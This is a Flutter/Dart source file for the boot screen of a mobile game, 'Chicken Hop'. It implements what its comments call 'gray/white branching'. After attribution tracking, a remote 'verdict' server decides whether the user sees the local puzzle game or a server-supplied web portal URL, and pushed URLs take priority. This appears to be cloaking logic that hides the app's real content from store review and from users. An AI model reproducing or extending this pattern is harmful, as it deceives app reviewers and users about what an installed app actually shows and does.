import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../core/alert_dispatcher.dart';
import '../core/attribution_tracker.dart';
import '../core/local_vault.dart';
import '../core/net_sensor.dart';
import '../core/verdict_gateway.dart';
import '../screens/menu_screen.dart';
import '../types/launch_mode.dart';
import 'offline_stage.dart';
import 'portal_stage.dart' deferred as portal_module;
import 'push_consent_stage.dart';

// ─────────────────────────────────────────────────────────────────────
// BOOT GATE — orchestrates the gray/white branching with a loading UI
// ─────────────────────────────────────────────────────────────────────
// The visual is the existing Chicken Hop loading scene (horz_main /
// goriz_main backgrounds + animated wooden progress bar). The bar
// advances at four checkpoints driven by `_advance()` so the user
// gets meaningful feedback while attribution + verdict are resolved.
//
// Routing logic (see android_gray_guide.md → "Gray Flow State Machine"):
//   firstBoot:   internet → tracker → verdict → portal | local
//   web:         push URL > fresh verdict > saved URL > offline
//   local:       direct → MenuScreen (no network needed)
// ─────────────────────────────────────────────────────────────────────

class BootGate extends StatefulWidget {
  final LocalVault vault;
  final NetSensor sensor;
  final AttributionTracker tracker;
  final VerdictGateway gateway;
  final AlertDispatcher alerts;

  const BootGate({
    super.key,
    required this.vault,
    required this.sensor,
    required this.tracker,
    required this.gateway,
    required this.alerts,
  });

  @override
  State<BootGate> createState() => _BootGateState();
}

class _BootGateState extends State<BootGate>
    with TickerProviderStateMixin {
  late final AnimationController _barCtrl;
  late final AnimationController _dotsCtrl;
  bool _routed = false;
  double _target = 0.0;

  @override
  void initState() {
    super.initState();

    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    _barCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 400),
      lowerBound: 0.0,
      upperBound: 1.0,
    );
    _dotsCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    )..repeat();

    WidgetsBinding.instance.addPostFrameCallback((_) => _run());
  }

  @override
  void dispose() {
    widget.alerts.onTokenRotation = null;
    _barCtrl.dispose();
    _dotsCtrl.dispose();
    super.dispose();
  }

  Future<void> _advance(double to, {int ms = 350}) async {
    _target = to;
    _barCtrl.duration = Duration(milliseconds: ms);
    await _barCtrl.animateTo(to, curve: Curves.easeInOut);
  }

  Future<void> _run() async {
    widget.alerts.onTokenRotation = _onTokenRotation;

    await _advance(0.15, ms: 220);

    final mode = widget.vault.readMode();
    switch (mode) {
      case LaunchMode.local:
        await _runLocalPath();
        break;
      case LaunchMode.web:
        await _runWebPath();
        break;
      case LaunchMode.firstBoot:
        await _runFirstBootPath();
        break;
    }
  }

  void _onTokenRotation(String newToken) async {
    // Re-POST the verdict body with the rotated token so the back end
    // can keep pushing alerts to the right device.
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.composeVerdictBody(
      locale: locale,
      pushToken: newToken,
    );
    widget.gateway.consult(body);
  }

  // ── First boot ──────────────────────────────────────────────────
  Future<void> _runFirstBootPath() async {
    final live = await widget.sensor.isLive();
    if (!live) {
      await _completeBar();
      _jumpToOffline(firstBoot: true);
      return;
    }

    await _advance(0.35, ms: 280);
    await widget.tracker.launch();
    await Future.wait([
      widget.tracker.awaitFirstTouch(),
      widget.tracker.awaitDeepLink(),
    ]);
    await _advance(0.7, ms: 320);

    final body = await widget.tracker.composeVerdictBody(
      locale: Platform.localeName.replaceAll('-', '_'),
      pushToken: widget.alerts.token,
    );
    final verdict = await widget.gateway.consult(body);

    if (verdict.accepted && (verdict.destination?.isNotEmpty ?? false)) {
      await widget.vault.writeMode(LaunchMode.web);
      await _completeBar();
      _jumpToPortal(verdict.destination!);
    } else {
      await widget.vault.writeMode(LaunchMode.local);
      await _completeBar();
      _jumpToLocal();
    }
  }

  // ── Returning web ────────────────────────────────────────────────
  Future<void> _runWebPath() async {
    final live = await widget.sensor.isLive();
    if (!live) {
      // Even offline we will try to reuse the cached URL — the portal
      // stage itself shows the offline screen if the request fails.
      final saved = widget.vault.readResolvedUrl();
      await _completeBar();
      if (saved != null && saved.isNotEmpty) {
        _jumpToPortal(saved);
      } else {
        _jumpToOffline(firstBoot: false);
      }
      return;
    }

    // Cold-start push URL beats everything.
    final pushed = await widget.vault.takeColdPushUrl();
    if (pushed != null && pushed.isNotEmpty) {
      await _completeBar();
      _jumpToPortal(pushed);
      return;
    }

    final saved = widget.vault.readResolvedUrl();
    await _advance(0.45, ms: 260);

    await widget.tracker.launch();
    await Future.wait([
      widget.tracker
          .awaitFirstTouch(max: const Duration(seconds: 10)),
      widget.tracker.awaitDeepLink(),
    ]);
    await _advance(0.75, ms: 260);

    final body = await widget.tracker.composeVerdictBody(
      locale: Platform.localeName.replaceAll('-', '_'),
      pushToken: widget.alerts.token,
    );
    final verdict = await widget.gateway.consult(body);

    await _completeBar();
    if (verdict.accepted && (verdict.destination?.isNotEmpty ?? false)) {
      _jumpToPortal(verdict.destination!);
    } else if (saved != null && saved.isNotEmpty) {
      _jumpToPortal(saved);
    } else {
      _jumpToOffline(firstBoot: false);
    }
  }

  // ── Returning local (puzzle) ─────────────────────────────────────
  Future<void> _runLocalPath() async {
    await _advance(0.55, ms: 280);
    await Future.delayed(const Duration(milliseconds: 220));
    await _completeBar();
    _jumpToLocal();
  }

  Future<void> _completeBar() async {
    if (_target < 0.92) {
      await _advance(0.92, ms: 260);
    }
    await Future.delayed(const Duration(milliseconds: 180));
    await _advance(1.0, ms: 380);
    await Future.delayed(const Duration(milliseconds: 220));
  }

  // ── Navigation helpers ───────────────────────────────────────────

  Future<void> _jumpToPortal(String url) async {
    if (_routed || !mounted) return;
    _routed = true;

    await portal_module.loadLibrary();
    if (!mounted) return;

    final route = MaterialPageRoute<void>(
      builder: (_) => widget.vault.shouldShowPushPromo()
          ? PushConsentStage(
              vault: widget.vault,
              alerts: widget.alerts,
              sensor: widget.sensor,
              portalUrl: url,
            )
          : portal_module.PortalStage(
              landingUrl: url,
              vault: widget.vault,
              alerts: widget.alerts,
              sensor: widget.sensor,
            ),
    );
    Navigator.of(context).pushReplacement(route);
  }

  void _jumpToLocal() {
    if (_routed || !mounted) return;
    _routed = true;
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const MenuScreen()),
    );
  }

  void _jumpToOffline({required bool firstBoot}) {
    if (_routed || !mounted) return;
    _routed = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineStage(
          onRetryBuilder: (_) => BootGate(
            vault: widget.vault,
            sensor: widget.sensor,
            tracker: widget.tracker,
            gateway: widget.gateway,
            alerts: widget.alerts,
          ),
        ),
      ),
    );
  }

  // ── UI ───────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF8FD16F),
      body: LayoutBuilder(
        builder: (ctx, constraints) {
          final portrait =
              constraints.maxHeight >= constraints.maxWidth;
          final bg = portrait
              ? 'assets/horz_main.webp'
              : 'assets/goriz_main.webp';

          final shortest = portrait
              ? constraints.maxWidth
              : constraints.maxHeight;
          final longest = portrait
              ? constraints.maxHeight
              : constraints.maxWidth;

          final labelSize = portrait
              ? (shortest * 0.07).clamp(22.0, 34.0)
              : (shortest * 0.07).clamp(18.0, 26.0);
          final barH = portrait
              ? (shortest * 0.07).clamp(22.0, 32.0)
              : (shortest * 0.06).clamp(18.0, 26.0);
          final barW = portrait ? longest * 0.78 : longest * 0.55;
          final bottomGap = portrait
              ? constraints.maxHeight * 0.08
              : constraints.maxHeight * 0.10;
          final labelGap = portrait ? 18.0 : 10.0;

          return Stack(
            fit: StackFit.expand,
            children: [
              Image.asset(
                bg,
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) =>
                    Container(color: const Color(0xFF8FD16F)),
              ),
              Positioned(
                left: 0,
                right: 0,
                bottom: bottomGap,
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    _LoadingLabel(
                      dots: _dotsCtrl,
                      size: labelSize,
                    ),
                    SizedBox(height: labelGap),
                    SizedBox(
                      width: barW,
                      child: _ProgressTrack(
                        progress: _barCtrl,
                        height: barH,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

class _LoadingLabel extends StatelessWidget {
  final AnimationController dots;
  final double size;
  const _LoadingLabel({required this.dots, required this.size});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: dots,
      builder: (_, __) {
        final phase = (dots.value * 4).floor() % 4;
        final tail = '.' * phase;
        return Text(
          'Loading$tail',
          style: TextStyle(
            color: Colors.white,
            fontSize: size,
            fontWeight: FontWeight.w900,
            letterSpacing: 1.4,
            shadows: const [
              Shadow(
                offset: Offset(0, 3),
                blurRadius: 6,
                color: Color(0x99000000),
              ),
            ],
          ),
        );
      },
    );
  }
}

class _ProgressTrack extends StatelessWidget {
  final AnimationController progress;
  final double height;

  const _ProgressTrack({required this.progress, required this.height});

  @override
  Widget build(BuildContext context) {
    final outerRadius = BorderRadius.circular(height * 0.6);
    return Container(
      height: height,
      decoration: BoxDecoration(
        borderRadius: outerRadius,
        border: Border.all(color: const Color(0xFF5B3A1B), width: 3),
        gradient: const LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [Color(0xFF3B2A14), Color(0xFF5B3A1B)],
        ),
        boxShadow: const [
          BoxShadow(
            color: Color(0x66000000),
            blurRadius: 10,
            offset: Offset(0, 5),
          ),
        ],
      ),
      child: Padding(
        padding: const EdgeInsets.all(3),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(height * 0.5),
          child: AnimatedBuilder(
            animation: progress,
            builder: (_, __) {
              return Stack(
                children: [
                  Container(color: const Color(0xFF2A1C0A)),
                  FractionallySizedBox(
                    alignment: Alignment.centerLeft,
                    widthFactor: progress.value,
                    child: Container(
                      decoration: const BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topCenter,
                          end: Alignment.bottomCenter,
                          colors: [
                            Color(0xFFFFE38A),
                            Color(0xFFFFC93C),
                            Color(0xFFFF8C00),
                          ],
                          stops: [0.0, 0.5, 1.0],
                        ),
                      ),
                      child: Align(
                        alignment: Alignment.topCenter,
                        child: FractionallySizedBox(
                          heightFactor: 0.45,
                          widthFactor: 1.0,
                          child: Container(
                            margin:
                                const EdgeInsets.symmetric(horizontal: 6),
                            decoration: BoxDecoration(
                              borderRadius:
                                  BorderRadius.circular(height),
                              gradient: LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Colors.white.withValues(alpha: 0.55),
                                  Colors.white.withValues(alpha: 0.0),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              );
            },
          ),
        ),
      ),
    );
  }
}
